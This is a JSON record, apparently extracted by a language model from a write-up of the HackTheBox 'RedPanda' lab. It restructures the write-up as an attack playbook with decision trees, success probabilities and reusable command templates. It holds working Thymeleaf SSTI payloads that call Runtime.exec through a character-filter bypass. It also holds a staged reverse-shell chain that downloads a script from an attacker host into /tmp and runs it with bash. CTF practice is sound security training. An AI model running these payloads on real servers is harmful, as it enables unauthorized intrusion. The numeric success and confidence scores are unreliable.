{
  "writeup_id": "Htb_Redpanda",
  "scenario_fingerprint": {
    "scenario_name": "java_spring_boot_ssti_to_xxe",
    "primary_services": [
      "http",
      "ssh"
    ],
    "port_signature": "22+8080",
    "service_combination": "ssh+spring_boot_http",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "server_side_template_injection",
    "privilege_path": "web_user_to_root_via_xxe",
    "attack_complexity": "medium",
    "estimated_time": "90-120 minutes",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "spring_boot_framework",
      "ssti_with_banned_characters",
      "java_application_chain",
      "jpg_metadata_exploitation",
      "xml_external_entity_attack"
    ],
    "environmental_clues": [
      "whitelabel_error_page",
      "spring_boot_title",
      "java_web_application",
      "xml_export_functionality",
      "image_metadata_processing"
    ],
    "similar_scenarios": [
      "java_web_ssti",
      "spring_boot_exploitation"
    ],
    "unique_aspects": [
      "multi_stage_java_exploitation",
      "jpg_metadata_directory_traversal",
      "log_injection_to_xxe_chain",
      "root_java_application_abuse"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "Server-Side Template Injection (SSTI)",
        "success_reason": "Spring Boot application using Thymeleaf with insufficient input validation",
        "prerequisite_indicators": [
          "java_web_application",
          "spring_boot_framework",
          "thymeleaf_templating_engine",
          "user_input_processed_in_templates"
        ],
        "recognition_patterns": [
          "Spring Boot error pages on malformed input",
          "Template syntax errors with { } characters",
          "Whitelabel Error Page responses",
          "Mathematical expressions evaluated in responses"
        ],
        "failure_modes": [
          "complete_input_sanitization",
          "template_sandboxing_enabled",
          "all_special_characters_blocked",
          "output_encoding_implemented"
        ],
        "environmental_factors": [
          "default_spring_boot_configuration",
          "thymeleaf_expression_evaluation_enabled",
          "insufficient_waf_protection",
          "developer_unfamiliarity_with_ssti_risks"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "15-30 minutes"
      },
      {
        "technique": "Character Filter Bypass",
        "success_reason": "Incomplete blacklist allowing alternative Thymeleaf expression syntax",
        "prerequisite_indicators": [
          "character_based_filtering",
          "blacklist_implementation",
          "multiple_expression_syntaxes_available"
        ],
        "recognition_patterns": [
          "banned character error messages",
          "$ character blocked but * allowed",
          "Alternative expression delimiters functional"
        ],
        "failure_modes": [
          "comprehensive_whitelist_filtering",
          "all_expression_delimiters_blocked",
          "ast_based_input_validation"
        ],
        "environmental_factors": [
          "developer_incomplete_security_knowledge",
          "regex_based_filtering_implementation",
          "insufficient_testing_of_bypass_techniques"
        ],
        "success_probability": 0.82,
        "typical_timeframe": "10-20 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Thymeleaf SSTI vulnerability in search function",
        "discovery_method": "Error-based enumeration and payload testing",
        "why_critical": "Direct path to remote code execution on Java application",
        "how_to_recognize": [
          "Spring Boot Whitelabel Error Pages",
          "Template expression evaluation in user input",
          "Mathematical operations returning calculated results",
          "Java stack traces in error responses"
        ],
        "follow_up_actions": [
          "test_alternative_expression_syntaxes",
          "enumerate_banned_characters",
          "craft_rce_payload_with_allowed_characters",
          "establish_reverse_shell"
        ]
      },
      {
        "discovery": "Incomplete input filtering allowing bypass",
        "discovery_method": "Character enumeration with wfuzz",
        "why_critical": "Enabled exploitation despite security controls",
        "how_to_recognize": [
          "specific banned character error messages",
          "inconsistent filtering across expression types",
          "alternative delimiters not blocked"
        ],
        "follow_up_actions": [
          "map_all_blocked_characters",
          "test_alternative_expression_formats",
          "craft_bypass_payloads"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "web_application_user",
        "escalation_method": "SSTI_to_RCE",
        "why_possible": "Thymeleaf expressions allow Java Runtime access",
        "recognition_signs": [
          "T(java.lang.Runtime) expressions functional",
          "Process execution through getRuntime().exec()",
          "Network connectivity from target confirmed"
        ],
        "exploitation_path": "SSTI Discovery → Character Filter Bypass → Java Runtime Access → Command Execution"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 22,8080 open on Linux host with Spring Boot application",
        "decision": "Test for SSTI vulnerability in web application inputs",
        "reasoning": "Spring Boot commonly uses Thymeleaf templating which is vulnerable to SSTI",
        "confidence": 0.8,
        "alternatives": [
          {
            "option": "directory_brute_force",
            "when": "if SSTI fails"
          },
          {
            "option": "parameter_fuzzing",
            "when": "if no obvious injection points"
          }
        ],
        "success_indicators": [
          "template_expression_evaluation",
          "mathematical_operations_executed",
          "error_messages_revealing_template_engine"
        ],
        "next_decision": "identify_template_engine_and_bypass_filters"
      },
      {
        "step": 2,
        "situation": "SSTI confirmed but certain characters ($,_,~) are banned",
        "decision": "Use alternative Thymeleaf expression syntax (*{} instead of ${})",
        "reasoning": "Thymeleaf supports multiple expression types, filters may only block common ones",
        "confidence": 0.9,
        "prerequisites": [
          "ssti_vulnerability_confirmed",
          "character_blacklist_identified"
        ],
        "success_indicators": [
          "expression_evaluation_with_alternative_syntax"
        ],
        "failure_fallbacks": [
          "try_other_expression_types",
          "encoding_bypass",
          "nested_expressions"
        ]
      },
      {
        "step": 3,
        "situation": "SSTI bypass successful with *{} syntax",
        "decision": "Escalate to RCE using Java Runtime.exec() method",
        "reasoning": "Java applications allow system command execution through Runtime class",
        "confidence": 0.95,
        "prerequisites": [
          "ssti_bypass_working",
          "java_environment_confirmed"
        ],
        "success_indicators": [
          "command_execution_confirmed",
          "network_connectivity_established"
        ],
        "next_decision": "establish_persistent_shell"
      },
      {
        "step": 4,
        "situation": "RCE achieved but complex payload delivery needed",
        "decision": "Use curl to download and execute shell script from attacker server",
        "reasoning": "Avoids payload complexity and character restrictions in web interface",
        "confidence": 0.85,
        "alternatives": [
          {
            "option": "direct_reverse_shell",
            "when": "if payload length allows"
          },
          {
            "option": "base64_encoded_payload",
            "when": "if curl unavailable"
          }
        ],
        "success_indicators": [
          "http_request_to_attacker_server",
          "shell_connection_established"
        ],
        "failure_fallbacks": [
          "write_to_temp_and_execute",
          "python_reverse_shell"
        ]
      }
    ],
    "branching_logic": {
      "if_ssti_detected": {
        "action": "identify_template_engine_and_test_bypasses",
        "tools": [
          "burp_suite",
          "wfuzz",
          "manual_testing"
        ],
        "next_phase": "rce_exploitation"
      },
      "if_character_filtering_detected": {
        "action": "test_alternative_expression_syntaxes",
        "alternatives": [
          "*{}",
          "#{}",
          "@{}",
          "encoding_bypass"
        ],
        "decision_criteria": "based_on_template_engine_type"
      },
      "if_rce_achieved": {
        "action": "establish_reverse_shell",
        "methods": [
          "curl_and_execute",
          "direct_payload",
          "staged_payload"
        ],
        "tools": [
          "nc",
          "python_http_server"
        ]
      },
      "if_direct_execution_fails": {
        "action": "use_staged_approach",
        "steps": [
          "download_to_temp",
          "make_executable",
          "execute_separately"
        ],
        "reasoning": "bypasses_command_complexity_limitations"
      }
    },
    "optimization_rules": [
      {
        "rule": "always_test_ssti_on_spring_boot_applications",
        "reasoning": "high_success_rate_with_thymeleaf_template_engine",
        "applicability": "java_web_applications"
      },
      {
        "rule": "test_multiple_expression_syntaxes_when_filtering_detected",
        "reasoning": "filters_often_incomplete_across_all_syntax_types",
        "applicability": "template_injection_with_character_restrictions"
      },
      {
        "rule": "use_staged_payload_delivery_for_complex_exploits",
        "reasoning": "avoids_character_restrictions_and_payload_size_limits",
        "applicability": "web_application_rce_with_input_filtering"
      },
      {
        "rule": "verify_network_connectivity_before_reverse_shell_attempts",
        "reasoning": "confirms_outbound_access_and_payload_execution",
        "applicability": "rce_to_shell_escalation"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "Server-Side Template Injection (SSTI)",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "web_application_present",
          "template_engine_in_use",
          "user_input_processed_by_templates"
        ],
        "success_indicators": [
          "template_syntax_errors_exposed",
          "mathematical_expressions_evaluated",
          "banned_characters_message_displayed"
        ],
        "incompatible_with": [
          "input_sanitization_complete",
          "template_engine_sandboxed",
          "no_user_input_to_templates"
        ],
        "confidence_boosters": [
          "spring_boot_framework_detected",
          "java_application_indicators",
          "error_pages_reveal_stack_traces"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "XML External Entity (XXE)",
        "mitre_id": "T1203",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "xml_processing_functionality",
          "xml_export_endpoints_present",
          "external_entity_processing_enabled"
        ],
        "success_indicators": [
          "xml_export_functionality_found",
          "xml_content_type_responses",
          "file_system_access_via_entities"
        ],
        "incompatible_with": [
          "xml_external_entities_disabled",
          "xml_parser_hardened",
          "no_xml_processing"
        ],
        "confidence_boosters": [
          "export_xml_endpoints_discovered",
          "java_xml_parsers_in_use",
          "metadata_processing_functionality"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "15-45 minutes"
      },
      {
        "technique": "Directory Traversal",
        "mitre_id": "T1083",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "file_path_parameters_present",
          "insufficient_path_validation",
          "file_system_access_functionality"
        ],
        "success_indicators": [
          "path_parameters_in_urls",
          "file_serving_functionality",
          "metadata_file_processing"
        ],
        "incompatible_with": [
          "path_traversal_protection_enabled",
          "chroot_jail_implemented",
          "no_file_system_access"
        ],
        "confidence_boosters": [
          "image_metadata_processing",
          "file_upload_functionality",
          "dynamic_file_serving"
        ],
        "typical_success_rate": 0.7,
        "estimated_time": "10-25 minutes"
      }
    ],
    "environmental_detectors": {
      "spring_boot_application": {
        "port_indicators": [
          8080,
          8443,
          9090
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "Spring Boot",
          "Whitelabel Error Page"
        ],
        "confidence_threshold": 0.85
      },
      "java_web_application": {
        "port_indicators": [
          8080,
          8443,
          9090,
          8009
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "java",
          "tomcat",
          "jetty",
          "spring"
        ],
        "confidence_threshold": 0.8
      },
      "xml_processing_service": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "endpoint_indicators": [
          "/export.xml",
          "/api/xml",
          "*.xml"
        ],
        "confidence_threshold": 0.9
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "ssti_detection",
          "when": "spring_boot_detected",
          "reason": "template_engines_commonly_vulnerable"
        },
        {
          "attack": "xxe_exploitation",
          "when": "xml_export_endpoints_found",
          "reason": "java_xml_parsers_often_misconfigured"
        }
      ],
      "medium_priority": [
        {
          "attack": "directory_traversal",
          "when": "file_serving_functionality_detected",
          "reason": "path_validation_often_insufficient"
        },
        {
          "attack": "web_directory_bruteforce",
          "when": "web_service_detected",
          "reason": "may_reveal_additional_endpoints"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Server-Side Template Injection (SSTI)",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "curl",
            "command_template": "curl -X POST -d 'name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('{command}').getInputStream())}' http://{target}:{port}/search",
            "actual_command": "curl -X POST -d 'name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}' http://10.10.11.170:8080/search",
            "output_pattern": "uid=1000(woodenk) gid=1001(logs)",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "wfuzz",
            "command_template": "wfuzz -u http://{target}:{port}/search -d name=FUZZ -w {wordlist} --ss banned",
            "actual_command": "wfuzz -u http://10.10.11.170:8080/search -d name=FUZZ -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --ss banned",
            "success_factors": [
              "identifies_banned_characters",
              "reveals_filter_bypass_opportunities"
            ],
            "effectiveness_rating": 4
          }
        ],
        "prerequisites": [
          "spring_boot_application",
          "thymeleaf_templating_engine",
          "user_input_processed_in_templates"
        ],
        "success_indicators": [
          "mathematical_expressions_evaluated",
          "command_execution_achieved",
          "reverse_shell_established"
        ],
        "common_failures": [
          "input_validation_blocks_payloads",
          "banned_characters_prevent_exploitation",
          "template_engine_not_vulnerable"
        ],
        "follow_up_techniques": [
          "reverse_shell_establishment",
          "privilege_escalation_enumeration",
          "lateral_movement"
        ],
        "time_investment": "15-45 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Thymeleaf Expression Language Exploitation",
        "mitre_id": "T1059.007",
        "category": "execution",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "browser",
            "command_template": "*{T(java.lang.Runtime).getRuntime().exec('{command}')}",
            "actual_command": "*{T(java.lang.Runtime).getRuntime().exec('ping -c 1 10.10.14.6')}",
            "output_pattern": "ICMP packets received at attacker host",
            "effectiveness_rating": 5,
            "reliability": 0.9
          },
          {
            "name": "payload_with_output",
            "command_template": "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('{command}').getInputStream())}",
            "actual_command": "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
            "success_factors": [
              "apache_commons_io_available",
              "command_output_returned"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "thymeleaf_template_engine",
          "expression_language_enabled",
          "user_input_in_template_context"
        ],
        "success_indicators": [
          "command_output_displayed_in_response",
          "network_callbacks_received",
          "file_system_access_achieved"
        ],
        "common_failures": [
          "expression_language_disabled",
          "security_manager_restrictions",
          "classpath_dependencies_missing"
        ],
        "follow_up_techniques": [
          "file_download_and_execution",
          "reverse_shell_establishment",
          "system_enumeration"
        ],
        "time_investment": "10-30 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Reverse Shell via File Download and Execution",
        "mitre_id": "T1105",
        "category": "command_and_control",
        "phase": "persistence",
        "tools_used": [
          {
            "name": "python_http_server",
            "command_template": "python -m http.server {port}",
            "actual_command": "python -m http.server 80",
            "output_pattern": "HTTP server listening on port",
            "effectiveness_rating": 5,
            "reliability": 0.98
          },
          {
            "name": "curl_download",
            "command_template": "curl {attacker_ip}/{filename} -o /tmp/{filename}",
            "actual_command": "curl 10.10.14.6/shell -o /tmp/shell",
            "success_factors": [
              "network_connectivity",
              "write_permissions_tmp"
            ],
            "effectiveness_rating": 4
          },
          {
            "name": "bash_execution",
            "command_template": "bash /tmp/{filename}",
            "actual_command": "bash /tmp/shell",
            "success_factors": [
              "executable_permissions",
              "bash_available"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "command_execution_capability",
          "network_connectivity_to_attacker",
          "writable_directory_access"
        ],
        "success_indicators": [
          "file_successfully_downloaded",
          "reverse_shell_connection_established",
          "interactive_shell_obtained"
        ],
        "common_failures": [
          "network_filtering_blocks_download",
          "insufficient_file_permissions",
          "antivirus_detection"
        ],
        "follow_up_techniques": [
          "shell_upgrade_techniques",
          "privilege_escalation_enumeration",
          "persistence_establishment"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "wfuzz",
        "use_case": "input_validation_bypass_discovery",
        "effectiveness_rating": 4,
        "reliability": 0.85,
        "learning_curve": "medium",
        "essential_for": [
          "web_application_testing"
        ],
        "alternatives": [
          "burp_intruder",
          "manual_testing"
        ],
        "best_practices": [
          "use_comprehensive_character_sets",
          "filter_responses_by_content",
          "test_single_and_multi_character_patterns"
        ]
      },
      {
        "tool": "feroxbuster",
        "use_case": "web_directory_enumeration",
        "effectiveness_rating": 4,
        "reliability": 0.9,
        "learning_curve": "low",
        "essential_for": [
          "web_reconnaissance"
        ],
        "alternatives": [
          "gobuster",
          "dirbuster",
          "dirb"
        ],
        "best_practices": [
          "include_technology_specific_extensions",
          "use_appropriate_wordlists",
          "configure_proper_recursion_depth"
        ]
      },
      {
        "tool": "tcpdump",
        "use_case": "network_callback_verification",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "medium",
        "essential_for": [
          "blind_command_injection_testing"
        ],
        "alternatives": [
          "wireshark",
          "netcat_listeners"
        ],
        "best_practices": [
          "filter_by_protocol_and_interface",
          "run_with_appropriate_privileges",
          "monitor_during_payload_execution"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "ssti_to_reverse_shell",
        "steps": [
          {
            "step": 1,
            "command": "wfuzz -u http://10.10.11.170:8080/search -d name=FUZZ -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --ss banned",
            "purpose": "Identify banned characters in input validation",
            "expected_output": "Characters $, _, ~ are banned"
          },
          {
            "step": 2,
            "command": "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
            "purpose": "Test SSTI with command execution",
            "expected_output": "uid=1000(woodenk) gid=1001(logs)"
          },
          {
            "step": 3,
            "command": "python -m http.server 80",
            "purpose": "Start HTTP server for payload delivery",
            "expected_output": "HTTP server running on port 80"
          },
          {
            "step": 4,
            "command": "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl 10.10.14.6/shell -o /tmp/shell').getInputStream())}",
            "purpose": "Download reverse shell script",
            "expected_output": "File downloaded to /tmp/shell"
          },
          {
            "step": 5,
            "command": "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash /tmp/shell').getInputStream())}",
            "purpose": "Execute reverse shell",
            "expected_output": "Reverse shell connection established"
          }
        ],
        "success_rate": 0.85,
        "typical_duration": "20-40 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "RedPanda",
      "difficulty": "Easy",
      "os": "Linux",
      "platform": "HackTheBox",
      "release_date": "2022-07-09",
      "author": "Woodenk",
      "estimated_time": "60-90 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "ssti",
        "java_exploitation",
        "xxe"
      ],
      "key_vulnerabilities": [
        "server_side_template_injection",
        "directory_traversal",
        "xml_external_entity"
      ],
      "environment_type": "java_web_application",
      "real_world_relevance": "high",
      "learning_value": [
        "ssti_exploitation",
        "java_security",
        "xxe_attacks",
        "metadata_manipulation"
      ],
      "prerequisite_knowledge": [
        "web_application_security",
        "java_basics",
        "xml_fundamentals",
        "template_engines"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "template_injection",
        "xml_attacks",
        "privilege_escalation"
      ],
      "attack_types": [
        "initial_access",
        "privilege_escalation",
        "credential_access"
      ],
      "defensive_lessons": [
        "input_validation",
        "template_security",
        "xml_parser_hardening",
        "file_permissions"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Tabby",
        "Jeeves",
        "Arkham"
      ],
      "similarity_reasons": [
        "java_exploitation",
        "web_application_focus",
        "complex_attack_chains"
      ],
      "unique_aspects": [
        "jpg_metadata_exploitation",
        "log_injection_chaining",
        "spring_boot_ssti"
      ],
      "difficulty_factors": [
        "multi_stage_attack_chain",
        "java_application_analysis",
        "metadata_crafting"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T14:20:10.479881",
    "original_file": "0xdf_writeups/Htb Redpanda.md",
    "content_length": 35673,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}